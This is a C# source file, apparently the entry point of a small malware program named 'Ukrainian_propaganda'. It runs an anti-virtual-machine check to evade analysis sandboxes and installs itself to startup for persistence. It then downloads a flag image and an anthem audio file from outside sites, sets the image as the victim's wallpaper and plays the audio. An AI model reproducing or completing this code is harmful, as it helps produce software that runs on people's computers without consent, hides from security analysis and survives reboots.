using System.IO;
using static Ukrainian_propaganda.Startup;
using static Ukrainian_propaganda.Anthem;
using static Ukrainian_propaganda.Wallpaper;
using static Ukrainian_propaganda.AntiVM;

namespace Ukrainian_propaganda
{
    class Program
    {
        private static readonly string wallapaperPath = Path.Combine(Path.GetTempPath(), "ukraine_flag.jpg");
        private static readonly string anthemPath = Path.Combine(Path.GetTempPath(), "anthem_ukraine.wav");

        private static readonly string wallpaperUrl = "https://img5.goodfon.ru/original/5000x3333/7/fc/ukraine-flag-flag-of-ukraine-ukrainian-flag-ukrainian.jpg";
        private static readonly string anthemUrl = "https://zvukogram.com/index.php?r=site/download&id=2556&type=wav";

        static void Main(string[] args)
        {
            IsVirtualMachine();
            InstallToStartup();
            CheckWallpaper(wallpaperUrl, wallapaperPath);
            CheckWav(anthemUrl, anthemPath);
            SetWallpaper(wallapaperPath);
            PlayWav(anthemPath);
        }
    }
}
